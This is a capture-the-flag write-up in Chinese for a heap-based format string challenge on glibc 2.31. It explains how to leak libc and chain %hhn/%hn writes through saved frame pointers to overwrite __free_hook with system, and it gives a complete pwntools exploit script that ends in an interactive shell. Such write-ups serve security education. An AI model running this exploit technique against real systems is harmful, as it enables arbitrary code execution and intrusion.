# echo_sever

## 题目简述

程序把用户输入放在堆缓冲区中，再把该缓冲区直接作为格式字符串交给 `printf()`。目标环境为 glibc 2.31。由于 payload 位于堆上，不能像常见栈格式化字符串题那样在字符串尾部附加目标地址；利用必须借助已有的栈帧指针链，把某个格式化参数逐步改造成任意写指针。

## 解题过程

先发送 `%6$p-%13$p`。第 6 个参数泄露当前栈帧附近的指针，第 13 个参数泄露 `__libc_start_main` 返回地址：

```text
libc_base = leak_13 - 243 - offset(__libc_start_main)
```

栈上已有一条 RBP 指针链：第 6 个参数可通过 `%6$hhn` 改写下一层指针的最低字节，而改写后的指针又被第 10 个参数当作 `%n` 的目标。利用过程分两层：

1. 用 `%6$hhn` 把第 10 个参数指向保存第 13 个参数的栈槽；
2. 用 `%10$hn` 分两字节改写该栈槽，使第 13 个参数变成指向 `__free_hook` 的指针；
3. 用 `%13$hn` 分三次写入 `system` 的低 48 位，每次再通过 RBP 链把目标调整到 `__free_hook`、`__free_hook+2`、`__free_hook+4`；
4. 让下一次分配的堆缓冲区保存 `/bin/sh\0`，随后触发 `free(buffer)`，实际执行 `system(buffer)`。

下面是按官方利用顺序补全后的脚本。参数序号 `6/10/13`、返回地址修正值 `243` 和栈槽偏移 `0x18` 都依赖本题二进制与 libc，换构建后必须重新调试：

```python
#!/usr/bin/env python3
import hashlib
import string
from typing import Optional

from pwn import *
from pwnlib.util.iters import mbruteforce

context.arch = "amd64"

HOST = "challenge.host"
PORT = 0

io = remote(HOST, PORT)
libc = ELF("./libc-2.31.so", checksec=False)

io.recvuntil(b") == ")
digest = io.recvline().strip().decode()
proof = mbruteforce(
    lambda value: hashlib.sha256(value.encode()).hexdigest() == digest,
    string.printable,
    4,
    method="fixed",
)
io.sendlineafter(b"????> ", proof.encode())

def submit(payload: bytes, declared_length: Optional[int] = None) -> None:
    if declared_length is None:
        declared_length = len(payload)
    io.sendlineafter(b"length:\n>> ", str(declared_length).encode())
    io.send(payload)

submit(b"%6$p-%13$p\n")
rbp_value = int(io.recvuntil(b"-", drop=True), 16)
start_main_ret = int(io.recvline().strip(), 16)
libc.address = start_main_ret - 243 - libc.sym["__libc_start_main"]

free_hook = libc.sym["__free_hook"]
system = libc.sym["system"]
stack_slot_low = ((rbp_value & 0xff) + 0x18) & 0xff

log.success(f"rbp leak = {rbp_value:#x}")
log.success(f"libc base = {libc.address:#x}")

# 让参数 10 指向保存参数 13 的栈槽 + 2，先写目标地址的高半字。
submit(f"%{stack_slot_low + 2}c%6$hhn\n".encode())
submit(f"%{(free_hook >> 16) & 0xffff}c%10$hn\n".encode())

# 再指回该栈槽起点，补上 __free_hook 地址的低半字。
submit(f"%{stack_slot_low}c%6$hhn\n".encode(), 100)
submit(f"%{free_hook & 0xffff}c%10$hn\n".encode())

# 参数 13 现在是 __free_hook 指针，写入 system 的低 16 位。
submit(f"%{system & 0xffff}c%13$hn\n".encode())

# 把参数 13 的指针改为 __free_hook + 2，再写中间 16 位。
submit(f"%{(free_hook + 2) & 0xffff}c%10$hn\n".encode(), 100)
submit(f"%{(system >> 16) & 0xffff}c%13$hn\n".encode(), 100)

# 把参数 13 的指针改为 __free_hook + 4，再写高 16 位。
submit(f"%{(free_hook + 4) & 0xffff}c%10$hn\n".encode(), 100)
submit(f"%{(system >> 32) & 0xffff}c%13$hn\n".encode(), 100)

submit(b"/bin/sh\x00", 100)
io.sendlineafter(b"length:\n>> ", b"0")
io.interactive()
```

脚本中的 `PORT = 0` 是离线归档占位值，复现时必须替换为题目实例端口；不能把已经关闭的官方地址当作仍可用服务。

## 方法总结

格式化字符串是否在栈上，只影响“如何把目标地址变成参数”，不会消除 `%n` 写原语。堆上 payload 可以借助调用现场原有的指针链，先改指针、再改指针指向的数据，最终构造任意地址写。实际利用时要逐个确认参数序号、写入宽度、已输出字符数以及每轮分配大小；这些值几乎都对编译器、ASLR 栈布局和 libc 版本敏感。
